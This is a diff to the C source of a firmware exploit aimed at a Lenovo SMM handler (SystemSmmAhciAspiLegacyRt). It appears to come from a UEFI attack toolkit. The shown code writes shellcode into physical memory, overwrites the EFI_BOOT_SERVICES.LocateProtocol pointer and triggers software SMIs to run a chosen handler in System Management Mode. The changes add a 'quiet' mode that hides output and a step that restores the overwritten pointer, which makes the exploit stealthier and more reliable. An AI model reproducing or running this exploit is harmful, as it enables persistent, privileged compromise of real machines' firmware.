@@ -126,10 +126,17 @@ static unsigned char g_shellcode[] =
     0xc3                                                            //  ret
 };
 //--------------------------------------------------------------------------------------
-#pragma optimize("", off)
+// put SMM function into the separate executable section
+#pragma code_seg("_SMM")
 
 static void smm_handler(PUEFI_EXPL_SMM_SHELLCODE_CONTEXT context)
 {
+    if (context->ptr_addr)
+    {
+        // restore overwritten pointer
+        *(unsigned long long *)context->ptr_addr = context->ptr_val;
+    }
+
     // tell to the caller that smm_handler() was executed
     context->smi_count += 1;
    
@@ -139,12 +146,10 @@ static void smm_handler(PUEFI_EXPL_SMM_SHELLCODE_CONTEXT context)
 
         // call external handler
         user_handler((void *)context->user_context);
-    }    
-
-    return;
+    }
 }
 
-#pragma optimize("", on)
+#pragma code_seg()
 //--------------------------------------------------------------------------------------
 void expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info(void)
 {
@@ -162,7 +167,10 @@ void expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info(void)
     }
 }
 //--------------------------------------------------------------------------------------
-bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_target, UEFI_EXPL_SMM_HANDLER handler, void *context)
+bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
+    int target, PUEFI_EXPL_TARGET custom_target, 
+    UEFI_EXPL_SMM_HANDLER handler, void *context, 
+    bool quiet)
 {
     bool ret = false;
     UEFI_EXPL_TARGET *expl_target = NULL;
@@ -183,7 +191,10 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
         // get target model information
         expl_target = &g_targets[target];
 
-        printf("Using target \"%s\"\n", expl_target->name);
+        if (!quiet)
+        {
+            printf("Using target \"%s\"\n", expl_target->name);
+        }
     }
     else if (custom_target)
     {
@@ -214,9 +225,12 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
         expl_target->addr = efi_boot_services + EFI_BOOT_SERVICES_LocateProtocol;
     }
 
-    printf("EFI_BOOT_SERVICES.LocateProtocol address is 0x%llx\n", expl_target->addr);
+    if (!quiet)
+    {
+        printf("EFI_BOOT_SERVICES.LocateProtocol address is 0x%llx\n", expl_target->addr);
+    }
 
-    if (expl_target->smi_num != -1)
+    if (!quiet && expl_target->smi_num != -1)
     {
         printf("SMI handler number is %d\n", expl_target->smi_num);
     }
@@ -230,7 +244,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
         {
             printf(__FUNCTION__"() ERROR: uefi_expl_phys_addr() fails\n");
             return false;
-        }
+        }        
 
         smm_context.user_context = (unsigned long long)context;
     }
@@ -252,10 +266,13 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
         return false;
     }
 
-    printf(
-        "SMM payload handler address is 0x%llx with context at 0x%llx\n", 
-        handler_phys_addr, context_phys_addr
-    );
+    if (!quiet)
+    {
+        printf(
+            "SMM payload handler address is 0x%llx with context at 0x%llx\n", 
+            handler_phys_addr, context_phys_addr
+        );
+    }
 
     unsigned long long sc_addr = 0, sc_phys_addr = 0;       
     
@@ -268,7 +285,10 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
         *(unsigned long long *)&shellcode[SHELLCODE_OFFS_HANDLER] = handler_phys_addr;
         *(unsigned long long *)&shellcode[SHELLCODE_OFFS_CONTEXT] = context_phys_addr;
 
-        printf("Physical memory for shellcode allocated at 0x%llx\n", sc_phys_addr);
+        if (!quiet)
+        {
+            printf("Physical memory for shellcode allocated at 0x%llx\n", sc_phys_addr);
+        }
         
         if (uefi_expl_phys_mem_write(sc_phys_addr, sizeof(shellcode), shellcode))
         {
@@ -277,7 +297,13 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
             // read original pointer value
             if (uefi_expl_phys_mem_read(expl_target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val))
             {
-                printf("Old pointer 0x%llx value is 0x%llx\n", expl_target->addr, ptr_val);
+                if (!quiet)
+                {
+                    printf("Old pointer 0x%llx value is 0x%llx\n", expl_target->addr, ptr_val);
+                }
+
+                smm_context.ptr_addr = expl_target->addr;
+                smm_context.ptr_val = ptr_val;
 
                 // overwrite pointer value
                 if (uefi_expl_phys_mem_write(expl_target->addr, sizeof(sc_phys_addr), (unsigned char *)&sc_phys_addr))
@@ -295,9 +321,10 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
 
                     while (smi_num < MAX_SMI_NUM)
                     {
-                        printf("Generating software SMI %d...\n", smi_num);
-
-                        Sleep(500);
+                        if (!quiet)
+                        {
+                            printf("Generating software SMI %d...\n", smi_num);
+                        }
 
                         if (uefi_expl_smi_invoke(smi_num))
                         {
@@ -306,7 +333,10 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
                                 ret = true;
                             }
 
-                            printf(__FUNCTION__"(): Exploitation %s\n", ret ? "success" : "fails");                            
+                            if (!quiet)
+                            {
+                                printf(__FUNCTION__"(): Exploitation %s\n", ret ? "success" : "fails");
+                            }
                         }
                         else
                         {
@@ -341,7 +371,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_
         }        
 
         // free memory
-        uefi_expl_mem_free(sc_addr);
+        uefi_expl_mem_free(sc_addr, PAGE_SIZE);
     }
     else
     {
